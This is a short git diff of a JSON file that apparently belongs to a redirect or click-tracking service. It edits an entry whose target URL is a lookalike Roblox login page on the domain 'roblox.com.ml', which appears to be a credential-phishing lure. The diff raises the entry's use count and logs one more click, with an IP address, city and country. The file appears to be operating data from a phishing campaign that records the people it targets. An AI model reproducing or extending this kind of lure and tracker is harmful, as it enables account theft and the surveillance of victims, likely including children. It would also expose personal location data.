@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 422,
+    "useCount": 423,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3488,6 +3488,14 @@
         "city": "Soweto",
         "flag": "🇿🇦",
         "countryCode": "ZA"
+      },
+      {
+        "timestamp": 1777053933589,
+        "ip": "84.60.234.115",
+        "country": "Germany",
+        "city": "Hanover",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
       }
     ]
   },
